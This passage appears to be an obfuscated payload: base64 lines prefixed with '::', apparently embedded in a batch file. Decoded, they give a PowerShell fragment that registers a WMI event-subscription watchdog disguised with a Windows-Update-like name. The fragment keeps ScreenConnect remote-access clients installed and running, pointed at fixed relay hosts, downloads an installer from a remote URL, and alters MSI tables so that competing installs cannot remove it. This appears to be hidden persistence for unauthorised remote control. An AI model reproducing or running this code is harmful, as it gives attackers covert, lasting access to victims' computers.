::Y2FjaGVXYXRjaGRvZyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQog
::ICAgJGYgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRp
::b24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNoZVdh
::dGNoZG9nRiciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgJGMg
::PSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNs
::YXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmlsdGVyICJOYW1lPSdXdWNh
::Y2hlV2F0Y2hkb2dDJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAg
::ICAkYiA9ICRudWxsDQogICAgaWYgKCRmIC1hbmQgJGMpIHsNCiAgICAgICAgJGIg
::PSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNs
::YXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUgfA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uRmls
::dGVyIC1saWtlICcqV3VjYWNoZVdhdGNoZG9nRionIC1hbmQgJF8uQ29uc3VtZXIg
::LWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dDKicgfSB8DQogICAgICAgICAgICBTZWxl
::Y3QtT2JqZWN0IC1GaXJzdCAxDQogICAgfQ0KICAgIHJldHVybiBbYm9vbF0oJHQg
::LWFuZCAkZiAtYW5kICRjIC1hbmQgJGIpDQp9DQoNCmZ1bmN0aW9uIEVuc3VyZS1X
::YXRjaGRvZyB7DQogICAgaWYgKFRlc3QtV2F0Y2hkb2dHcmFwaCkgeyByZXR1cm4g
::J09LJyB9DQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0dXJuICdNSVNTSU5H
::JyB9DQogICAgaWYgKEluc3RhbGwtV2F0Y2hkb2cpIHsgcmV0dXJuICdSRUFSTUVE
::JyB9DQogICAgcmV0dXJuICdGQUlMJw0KfQ0KDQojIENvcnJlY3QgMzItYml0ICsg
::NjQtYml0IEFSUCBoaXZlcy4gTDYgYW5kIGVhcmxpZXIgdXNlZCBhIHRydW5jYXRl
::ZA0KIyBXT1c2NDMyTm9kZSBwYXRoIChtaXNzaW5nIE1pY3Jvc29mdFxXaW5kb3dz
::KSBzbyBFVkVSWSAzMi1iaXQgU0MgcHJvZHVjdA0KIyB3YXMgaW52aXNpYmxlIHRv
::IHJlcGFpci9leHRlcm1pbmF0ZS9yZWdpc3RlcmVkLg0KJHNjcmlwdDpVbmluc3Rh
::bGxSb290cyA9IEAoDQogICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5k
::b3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsDQogICAgJ0hLTE06XFNPRlRX
::QVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9u
::XFVuaW5zdGFsbCcNCikNCg0KZnVuY3Rpb24gVGVzdC1TQ1JlZ2lzdGVyZWQoW3N0
::cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICAjIEw4OiBORVZFUiB1c2UgcmV0dXJu
::IGluc2lkZSBGb3JFYWNoLU9iamVjdCAtIGl0IG9ubHkgZXhpdHMgdGhlDQogICAg
::IyBwaXBlbGluZSBpdGVyYXRpb24sIHNvIHRoaXMgZnVuY3Rpb24gYWx3YXlzIGZl
::bGwgdGhyb3VnaCB0byAnbm8nDQogICAgIyBhbmQgdGhlIG1vbiBvcnBoYW4tbGFk
::ZGVyIGRlbGV0ZWQgaGVhbHRoeSByZWdpc3RlcmVkIHNlcnZpY2VzLg0KICAgIGlm
::ICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vJyB9DQogICAgJG5hbWUg
::PSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCkiDQogICAgZm9y
::ZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgew0KICAgICAg
::ICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51ZSB9DQogICAg
::ICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9y
::QWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7DQogICAgICAgICAgICAkZG4gPSAo
::R2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50
::bHlDb250aW51ZSkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgIGlmICgkZG4gLWFu
::ZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5hbWUgLWxpa2Ug
::J3sqfScpKSB7IHJldHVybiAneWVzJyB9DQogICAgICAgIH0NCiAgICB9DQogICAg
::cmV0dXJuICdubycNCn0NCg0KZnVuY3Rpb24gUmVwYWlyLVNDU2VydmljZShbc3Ry
::aW5nXSRGaW5nZXJwcmludCkgew0KICAgICMgTDMwOiBORVZFUiBydW4gbXNpZXhl
::YyAvZmEgb3IgL2kgb24gYSBTY3JlZW5Db25uZWN0IHByb2R1Y3Qg4oCUIFNDIGlu
::c3RhbmNlcyBzaGFyZQ0KICAgICMgbGVnYWN5IFVwZ3JhZGVDb2Rlcywgc28gYW55
::IG1zaWV4ZWMgcmVwYWlyL2luc3RhbGwgb24gb25lIEZQIHRyaWdnZXJzIGENCiAg
::ICAjIG1ham9yLXVwZ3JhZGUgcmVtb3ZhbCB0aGF0IGtub2NrcyB0aGUgR3J5eGEg
::c2libGluZyBPRkZMSU5FLiBTZXJ2aWNlLWxldmVsIGhlYWwgb25seS4NCiAgICBp
::ZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICduby1mcCcgfQ0KICAgICRu
::YW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIg0KICAg
::ICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JBY3Rpb24gU2ls
::ZW50bHlDb250aW51ZQ0KICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWVx
::ICdSdW5uaW5nJykgeyByZXR1cm4gJ3N2Yy1ydW5uaW5nJyB9DQogICAgaWYgKCRz
::dmMpIHsNCiAgICAgICAgIyBwcmVzZW50IGJ1dCBzdG9wcGVkIC0+IHNlcnZpY2Ut
::bGV2ZWwgc3RhcnQsIG5vIG1zaWV4ZWMNCiAgICAgICAgJiBzYy5leGUgY29uZmln
::ICIkbmFtZSIgc3RhcnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxsDQogICAgICAgICYg
::c2MuZXhlIGZhaWx1cmUgIiRuYW1lIiByZXNldD0gODY0MDAgYWN0aW9ucz0gcmVz
::dGFydC81MDAwL3Jlc3RhcnQvNTAwMC9yZXN0YXJ0LzUwMDAgMj4mMSB8IE91dC1O
::dWxsDQogICAgICAgICYgc2MuZXhlIHN0YXJ0ICIkbmFtZSIgMj4mMSB8IE91dC1O
::dWxsDQogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDYNCiAgICAgICAgJiBz
::Yy5leGUgc3RhcnQgIiRuYW1lIiAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgJHN2
::YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRs
::eUNvbnRpbnVlDQogICAgICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5TdGF0dXMgLWVx
::ICdSdW5uaW5nJykgeyByZXR1cm4gJ3N2Yy1zdGFydGVkJyB9DQogICAgICAgIHJl
::dHVybiAnc3ZjLXN0aWxsLXN0b3BwZWQtbm9yZXBhaXIobXNpZXhlYy1kaXNhYmxl
::ZCknDQogICAgfQ0KICAgICMgc2VydmljZSBlbnRyeSBnb25lOiByZS1jcmVhdGUg
::ZnJvbSB0aGUgcmVnaXN0ZXJlZCBwcm9kdWN0J3MgaW5zdGFsbCBkaXIgV0lUSE9V
::VCBtc2lleGVjLg0KICAgICMgSWYgYmluYXJpZXMgZXhpc3QsIHNjLmV4ZSBjcmVh
::dGUgKyBzdGFydC4gRWxzZSByZXBvcnQgc28gY2FsbGVyIGNhbiBkZWNpZGUgKG5l
::dmVyIC9mYSwgbmV2ZXIgL2kpLg0KICAgICRkaXIgPSAkbnVsbA0KICAgIGZvcmVh
::Y2ggKCRiYXNlIGluIEAoJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9LCAkZW52OlBy
::b2dyYW1GaWxlcykpIHsNCiAgICAgICAgJGNhbmQgPSBKb2luLVBhdGggJGJhc2Ug
::IlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIg0KICAgICAgICBp
::ZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRjYW5kICdTY3Jl
::ZW5Db25uZWN0LkNsaWVudFNlcnZpY2UuZXhlJykpIHsgJGRpciA9ICRjYW5kOyBi
::cmVhayB9DQogICAgfQ0KICAgIGlmICgtbm90ICRkaXIpIHsgcmV0dXJuICdub3Qt
::cmVnaXN0ZXJlZC1ub3JlcGFpcihtc2lleGVjLWRpc2FibGVkKScgfQ0KICAgICRl
::eGUgPSBKb2luLVBhdGggJGRpciAnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNl
::LmV4ZScNCiAgICAmIHNjLmV4ZSBjcmVhdGUgIiRuYW1lIiBiaW5QYXRoPSAiYCIk
::ZXhlYCIiIHN0YXJ0PSBhdXRvIERpc3BsYXlOYW1lPSAiJG5hbWUiIDI+JjEgfCBP
::dXQtTnVsbA0KICAgICYgc2MuZXhlIGZhaWx1cmUgIiRuYW1lIiByZXNldD0gODY0
::MDAgYWN0aW9ucz0gcmVzdGFydC81MDAwL3Jlc3RhcnQvNTAwMC9yZXN0YXJ0LzUw
::MDAgMj4mMSB8IE91dC1OdWxsDQogICAgJiBzYy5leGUgc3RhcnQgIiRuYW1lIiAy
::PiYxIHwgT3V0LU51bGwNCiAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyA1DQogICAg
::JHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlvbiBTaWxl
::bnRseUNvbnRpbnVlDQogICAgaWYgKCRzdmMgLWFuZCAkc3ZjLlN0YXR1cyAtZXEg
::J1J1bm5pbmcnKSB7IHJldHVybiAnc3ZjLXJlY3JlYXRlZC1zdGFydGVkJyB9DQog
::ICAgcmV0dXJuICdzdmMtcmVjcmVhdGVkLW5vdC1ydW5uaW5nJw0KfQ0KDQojIOKU
::gOKUgCBHcnl4YSBTQyB2MiAoY2xlYW4gcmV3cml0ZSkg4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQojIFNpbmdsZS1mbGlnaHQg
::ZW5zdXJlLiBSdW5uaW5nID0+IGhlYWx0aHkuIFN0b3BwZWQgc3ZjID0+IHN0YXJ0
::Lg0KIyBCcm9rZW4vU3R1Y2sgPT4gY2xlYW4tcmVpbnN0YWxsIG9uY2UsIGRldGFj
::aGVkLiBBYnNlbnQgPT4gaW5zdGFsbCBvbmNlLg0KIyBObyAvZmEsIG5vIGlubGlu
::ZSBibG9ja2luZyAvaSwgbm8gZmFsc2UgImFscmVhZHlfcnVubmluZyIuDQokc2Ny
::aXB0OkdyeXhhRGVmYXVsdEZwID0gJzM2ZTUwNmZmMDE2YjIxNTEnDQokc2NyaXB0
::OkdyeXhhTXNpVXJsID0gJ2h0dHBzOi8vdWkuZ3J5eGEuY29tL0Jpbi9TY3JlZW5D
::b25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0Jw0KJHNjcmlw
::dDpHcnl4YVJlbGF5SG9zdCA9ICd1cGRhdGUuZ3J5eGEuY29tJw0KJHNjcmlwdDpH
::cnl4YVVpSG9zdCA9ICd1aS5ncnl4YS5jb20nDQokc2NyaXB0OlNldnJ6RGVmYXVs
::dFByaW1hcnkgPSAnNWY2MDEwNTc5ODUyZTUwNycNCiRzY3JpcHQ6U2V2cnpEZWZh
::dWx0QWx0ID0gJ2Y4NjFjODE0MGQ0NTM0MjcnDQokc2NyaXB0OlNldnJ6S2VlcCA9
::IEAoJHNjcmlwdDpTZXZyekRlZmF1bHRQcmltYXJ5LCAkc2NyaXB0OlNldnJ6RGVm
::YXVsdEFsdCkNCiMgU2V0IHRvIGEgMTYtaGV4IEZQIHlvdSBXQU5UIGluc3RhbGxl
::ZCAoYWZ0ZXIgcm90YXRpbmcgb24gdGhlIHBhbmVsKS4gQW55IGhvc3QNCiMgcnVu
::bmluZyBhIGRpZmZlcmVudCBGUCBtaWdyYXRlcyB0byB0aGlzIG9uZS4gTGVhdmUg
::JycgdG8ganVzdCB0cmFjayB3aGF0ZXZlciBydW5zLg0KJHNjcmlwdDpHcnl4YUV4
::cGVjdGVkRnAgPSAnMzZlNTA2ZmYwMTZiMjE1MScNCg0KIyBMNDA6IFJTQSBwdWJs
::aWMga2V5IGZvciB1cGRhdGUubWFuaWZlc3QgdmVyaWZpY2F0aW9uIChwcml2YXRl
::IGtleSBpbiBrZXlzLywgZ2l0aWdub3JlZCkNCiRzY3JpcHQ6VXBkYXRlUHViS2V5
::WG1sID0gQCcNCjxSU0FLZXlWYWx1ZT48TW9kdWx1cz50QUJaUG52c3Vwb3JpMTlt
::dEpiSG9UMXVGR1ZMTktxT05CMHh0dklCSDRIcGZNNVUrU3RDdUduRWRJeVB5a01R
::UGpERWxWQlpPZWE4cGRkQnh4UE1JOTRkNFZCcGR3blFlZFdIbG5sNkV1UXNKTDJN
::TWMweG8wZHV6cFFkUFZqRG5lSUl0T3hWTW5sNE1tVFNTOGkxNU9mTlRINnlkZGxm
::aTZ0TmZUdnZDdGt4bEw5YzBxWHh0SW9ZTFFMOWpDMjk0dDJPMHZPc0FsaWgwaFM2
::WEFHcDhPQVRLUi9LVlBwOHFmdzh0enJTdktnWWtwZTc5Yko2N2J0ak83cVRIdjFK
::cFAwNHhlWXRDS2pTRk42WGgwMmRydHF2eXVDSHZ3MSswSFlmdmlhSDV5TkFwd29O
::eC9mNVU2M3VNaWlyS3VKYVpNQnZYTTh1bXh5a0FHcnFkU1UwcFE9PTwvTW9kdWx1
::cz48RXhwb25lbnQ+QVFBQjwvRXhwb25lbnQ+PC9SU0FLZXlWYWx1ZT4NCidADQoN
::CmZ1bmN0aW9uIEdldC1Hcnl4YUNmZ1BhdGggeyBKb2luLVBhdGggJFdvcmtEaXIg
::J2dyeXhhLmNmZycgfQ0KZnVuY3Rpb24gR2V0LVNldnJ6Q2ZnUGF0aCB7IEpvaW4t
::UGF0aCAkV29ya0RpciAnc2V2cnouY2ZnJyB9DQoNCmZ1bmN0aW9uIEdldC1TZXZy
::ektlZXAgew0KICAgICRwcmltID0gJHNjcmlwdDpTZXZyekRlZmF1bHRQcmltYXJ5
::DQogICAgJGFsdCA9ICRzY3JpcHQ6U2V2cnpEZWZhdWx0QWx0DQogICAgJHAgPSBH
::ZXQtU2V2cnpDZmdQYXRoDQogICAgaWYgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
::JHApIHsNCiAgICAgICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRwIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
::ICAgICAgICAgaWYgKCRfIC1tYXRjaCAnXlBSSU1BUllfRlA9KFswLTlhLWZBLUZd
::ezE2fSlccyokJykgeyAkcHJpbSA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9DQog
::ICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdeQUxUX0ZQPShbMC05YS1mQS1GXXsx
::Nn0pXHMqJCcpIHsgJGFsdCA9ICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9DQogICAg
::ICAgICAgICBpZiAoJF8gLW1hdGNoICdeRVhQRUNURURfUFJJTUFSWT0oWzAtOWEt
::ZkEtRl17MTZ9KVxzKiQnKSB7ICRwcmltID0gJG1hdGNoZXNbMV0uVG9Mb3dlcigp
::IH0NCiAgICAgICAgICAgIGlmICgkXyAtbWF0Y2ggJ15FWFBFQ1RFRF9BTFQ9KFsw
::LTlhLWZBLUZdezE2fSlccyokJykgeyAkYWx0ID0gJG1hdGNoZXNbMV0uVG9Mb3dl
::cigpIH0NCiAgICAgICAgfQ0KICAgIH0NCiAgICAkc2NyaXB0OlNldnJ6S2VlcCA9
::IEAoJHByaW0sICRhbHQpDQogICAgcmV0dXJuIEAoJHByaW0sICRhbHQpDQp9DQoN
::CmZ1bmN0aW9uIFNldC1TZXZyekZwKFtzdHJpbmddJFByaW1hcnksIFtzdHJpbmdd
::JEFsdCkgew0KICAgIGlmICgtbm90ICRQcmltYXJ5KSB7ICRQcmltYXJ5ID0gJHNj
::cmlwdDpTZXZyekRlZmF1bHRQcmltYXJ5IH0NCiAgICBpZiAoLW5vdCAkQWx0KSB7
::ICRBbHQgPSAkc2NyaXB0OlNldnJ6RGVmYXVsdEFsdCB9DQogICAgaWYgKC1ub3Qg
::KFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFdvcmtEaXIpKSB7IE5ldy1JdGVtIC1J
::dGVtVHlwZSBEaXJlY3RvcnkgLVBhdGggJFdvcmtEaXIgLUZvcmNlIHwgT3V0LU51
::bGwgfQ0KICAgIEAoDQogICAgICAgICJQUklNQVJZX0ZQPSQoJFByaW1hcnkuVG9M
::b3dlcigpKSIsDQogICAgICAgICJBTFRfRlA9JCgkQWx0LlRvTG93ZXIoKSkiLA0K
::ICAgICAgICAiRVhQRUNURURfUFJJTUFSWT0kKCRQcmltYXJ5LlRvTG93ZXIoKSki
::LA0KICAgICAgICAiRVhQRUNURURfQUxUPSQoJEFsdC5Ub0xvd2VyKCkpIiwNCiAg
::ICAgICAgIlVQREFURUQ9JCgoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRv
::U3RyaW5nKCdvJykpIg0KICAgICkgfCBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGgg
::KEdldC1TZXZyekNmZ1BhdGgpIC1FbmNvZGluZyBBU0NJSSAtRm9yY2UNCiAgICAk
::c2NyaXB0OlNldnJ6S2VlcCA9IEAoJFByaW1hcnkuVG9Mb3dlcigpLCAkQWx0LlRv
::TG93ZXIoKSkNCn0NCg0KZnVuY3Rpb24gU3luYy1TZXZyekV4cGVjdGVkKFtzdHJp
::bmddJEV4cGVjdGVkVGV4dCkgew0KICAgICMgQXBwbHkgcmVwbyBzZXZyel9leHBl
::Y3RlZC5jZmcgYm9keSAoRVhQRUNURURfUFJJTUFSWT0vRVhQRUNURURfQUxUPSBs
::aW5lcykNCiAgICAkcHJpbSA9ICRudWxsOyAkYWx0ID0gJG51bGwNCiAgICBmb3Jl
::YWNoICgkbGluZSBpbiAoJEV4cGVjdGVkVGV4dCAtc3BsaXQgImByP2BuIikpIHsN
::CiAgICAgICAgaWYgKCRsaW5lIC1tYXRjaCAnXkVYUEVDVEVEX1BSSU1BUlk9KFsw
::LTlhLWZBLUZdezE2fSlccyokJykgeyAkcHJpbSA9ICRtYXRjaGVzWzFdLlRvTG93
::ZXIoKSB9DQogICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ15FWFBFQ1RFRF9BTFQ9
::KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkYWx0ID0gJG1hdGNoZXNbMV0uVG9M
::b3dlcigpIH0NCiAgICB9DQogICAgaWYgKC1ub3QgJHByaW0pIHsgJHByaW0gPSAo
::R2V0LVNldnJ6S2VlcClbMF0gfQ0KICAgIGlmICgtbm90ICRhbHQpIHsgJGFsdCA9
::IChHZXQtU2V2cnpLZWVwKVsxXSB9DQogICAgU2V0LVNldnJ6RnAgJHByaW0gJGFs
::dA0KICAgIHJldHVybiAiU0VWUlp8JHByaW18JGFsdCINCn0NCg0KZnVuY3Rpb24g
::UHJvdGVjdC1Nc2lTaWJsaW5nU2FmZShbc3RyaW5nXSRNc2lQYXRoKSB7DQogICAg
::IyBMNDA6IGNvcHkgTVNJIGFuZCBERUxFVEUgRlJPTSBVcGdyYWRlIHNvIC9pIGNh
::bm5vdCBSZW1vdmVFeGlzdGluZ1Byb2R1Y3RzIHNpYmxpbmdzLg0KICAgIGlmICgt
::bm90ICRNc2lQYXRoIC1vciAtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRN
::c2lQYXRoKSkgeyByZXR1cm4gJG51bGwgfQ0KICAgICRzYWZlID0gSm9pbi1QYXRo
::ICRlbnY6VEVNUCAoInNjX3NhZmVfezB9Lm1zaSIgLWYgW2d1aWRdOjpOZXdHdWlk
::KCkuVG9TdHJpbmcoJ04nKSkNCiAgICB0cnkgew0KICAgICAgICBDb3B5LUl0ZW0g
::LUxpdGVyYWxQYXRoICRNc2lQYXRoIC1EZXN0aW5hdGlvbiAkc2FmZSAtRm9yY2UN
::CiAgICAgICAgJGkgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV2luZG93c0luc3Rh
::bGxlci5JbnN0YWxsZXINCiAgICAgICAgJGRiID0gJGkuT3BlbkRhdGFiYXNlKChS
::ZXNvbHZlLVBhdGggLUxpdGVyYWxQYXRoICRzYWZlKS5QYXRoLCAxKQ0KICAgICAg
::ICB0cnkgew0KICAgICAgICAgICAgJHYgPSAkZGIuT3BlblZpZXcoJ0RFTEVURSBG
::Uk9NIGBVcGdyYWRlYCcpDQogICAgICAgICAgICAkdi5FeGVjdXRlKCkgfCBPdXQt
::TnVsbA0KICAgICAgICAgICAgJGRiLkNvbW1pdCgpDQogICAgICAgIH0gY2F0Y2gg
::e30NCiAgICAgICAgcmV0dXJuICRzYWZlDQogICAgfSBjYXRjaCB7DQogICAgICAg
::IGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRzYWZlKSB7IFJlbW92ZS1JdGVt
::IC1MaXRlcmFsUGF0aCAkc2FmZSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUgfQ0KICAgICAgICByZXR1cm4gJE1zaVBhdGgNCiAgICB9DQp9DQoN
::CmZ1bmN0aW9uIFRlc3QtVXBkYXRlTWFuaWZlc3QoW3N0cmluZ10kTWFuaWZlc3RQ
::YXRoLCBbc3RyaW5nXSRTaWdQYXRoLCBbaGFzaHRhYmxlXSRGaWxlTWFwKSB7DQog
::ICAgIyBWZXJpZnkgUlNBLVNIQTI1NiBzaWduYXR1cmUgb3ZlciB1cGRhdGUubWFu
::aWZlc3QsIHRoZW4gU0hBMjU2IG9mIGVhY2ggc3RhZ2VkIGZpbGUuDQogICAgaWYg
::KC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJE1hbmlmZXN0UGF0aCkgLW9y
::IC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJFNpZ1BhdGgpKSB7IHJldHVy
::biAnbWlzc2luZycgfQ0KICAgIGlmICgtbm90ICRzY3JpcHQ6VXBkYXRlUHViS2V5
::WG1sIC1vciAkc2NyaXB0OlVwZGF0ZVB1YktleVhtbCAtbWF0Y2ggJ1BMQUNFSE9M
::REVSJykgeyByZXR1cm4gJ25vLXB1YmtleScgfQ0KICAgIHRyeSB7DQogICAgICAg
::ICRieXRlcyA9IFtJTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKChSZXNvbHZlLVBhdGgg
::LUxpdGVyYWxQYXRoICRNYW5pZmVzdFBhdGgpLlBhdGgpDQogICAgICAgICRzaWcg
::PSBbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKFtJTy5GaWxlXTo6UmVhZEFs
::bFRleHQoKFJlc29sdmUtUGF0aCAtTGl0ZXJhbFBhdGggJFNpZ1BhdGgpLlBhdGgp
::LlRyaW0oKSkpDQogICAgICAgICRyc2EgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0
::b2dyYXBoeS5SU0FdOjpDcmVhdGUoKQ0KICAgICAgICAkcnNhLkZyb21YbWxTdHJp
::bmcoJHNjcmlwdDpVcGRhdGVQdWJLZXlYbWwpDQogICAgICAgIGlmICgtbm90ICRy
::c2EuVmVyaWZ5RGF0YSgkYnl0ZXMsICRzaWcsIFtTeXN0ZW0uU2VjdXJpdHkuQ3J5
::cHRvZ3JhcGh5Lkhhc2hBbGdvcml0aG1OYW1lXTo6U0hBMjU2LCBbU3lzdGVtLlNl
::Y3VyaXR5LkNyeXB0b2dyYXBoeS5SU0FTaWduYXR1cmVQYWRkaW5nXTo6UGtjczEp
::KSB7DQogICAgICAgICAgICByZXR1cm4gJ2JhZC1zaWcnDQogICAgICAgIH0NCiAg
::ICAgICAgJGRvYyA9IEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkTWFuaWZlc3RQ
::YXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uDQogICAgICAgIGZvcmVhY2ggKCRu
::YW1lIGluICRGaWxlTWFwLktleXMpIHsNCiAgICAgICAgICAgICRwYXRoID0gJEZp
::bGVNYXBbJG5hbWVdDQogICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoIC1M
::aXRlcmFsUGF0aCAkcGF0aCkpIHsgcmV0dXJuICJtaXNzaW5nLWZpbGU6JG5hbWUi
::IH0NCiAgICAgICAgICAgICR3YW50ID0gW3N0cmluZ10kZG9jLmZpbGVzLiRuYW1l
::DQogICAgICAgICAgICBpZiAoLW5vdCAkd2FudCkgeyByZXR1cm4gIm5vdC1pbi1t
::YW5pZmVzdDokbmFtZSIgfQ0KICAgICAgICAgICAgJHNoYSA9IFtTeXN0ZW0uU2Vj
::dXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTI1Nl06OkNyZWF0ZSgpDQogICAgICAgICAg
::ICAkZnMgPSBbSU8uRmlsZV06Ok9wZW5SZWFkKChSZXNvbHZlLVBhdGggLUxpdGVy
::YWxQYXRoICRwYXRoKS5QYXRoKQ0KICAgICAgICAgICAgdHJ5IHsgJGhhc2ggPSAo
::W0JpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRzaGEuQ29tcHV0ZUhhc2goJGZzKSkp
::LlJlcGxhY2UoJy0nLCAnJykuVG9Mb3dlcigpIH0NCiAgICAgICAgICAgIGZpbmFs
::bHkgeyAkZnMuQ2xvc2UoKSB9DQogICAgICAgICAgICBpZiAoJGhhc2ggLW5lICR3
::YW50LlRvTG93ZXIoKSkgeyByZXR1cm4gImhhc2gtbWlzbWF0Y2g6JG5hbWUiIH0N
::CiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJ29rJw0KICAgIH0gY2F0Y2ggeyBy
::ZXR1cm4gImVycm9yOiQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIiB9DQp9DQoNCmZ1
::bmN0aW9uIEdldC1Hcnl4YUZwIHsNCiAgICAkZnAgPSAkc2NyaXB0OkdyeXhhRGVm
::YXVsdEZwDQogICAgJHAgPSBHZXQtR3J5eGFDZmdQYXRoDQogICAgaWYgKFRlc3Qt
::UGF0aCAtTGl0ZXJhbFBhdGggJHApIHsNCiAgICAgICAgR2V0LUNvbnRlbnQgLUxp
::dGVyYWxQYXRoICRwIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9y
::RWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgaWYgKCRfIC1tYXRjaCAnXkNVUlJF
::TlRfRlA9KFswLTlhLWZBLUZdezE2fSlccyokJykgeyAkZnAgPSAkbWF0Y2hlc1sx
::XS5Ub0xvd2VyKCkgfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkZnAN
::Cn0NCg0KZnVuY3Rpb24gU2V0LUdyeXhhRnAoW3N0cmluZ10kRmluZ2VycHJpbnQp
::IHsNCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuIH0NCiAgICBp
::ZiAoLW5vdCAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkV29ya0RpcikpIHsgTmV3
::LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAkV29ya0RpciAtRm9yY2Ug
::fCBPdXQtTnVsbCB9DQogICAgQCgNCiAgICAgICAgIkNVUlJFTlRfRlA9JCgkRmlu
::Z2VycHJpbnQuVG9Mb3dlcigpKSIsDQogICAgICAgICJSRUxBWT0kKCRzY3JpcHQ6
::R3J5eGFSZWxheUhvc3QpIiwNCiAgICAgICAgIlVJPSQoJHNjcmlwdDpHcnl4YVVp
::SG9zdCkiLA0KICAgICAgICAiTVNJVVJMPSQoJHNjcmlwdDpHcnl4YU1zaVVybCki
::LA0KICAgICAgICAiVVBEQVRFRD0kKChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1l
::KCkuVG9TdHJpbmcoJ28nKSkiDQogICAgKSB8IFNldC1Db250ZW50IC1MaXRlcmFs
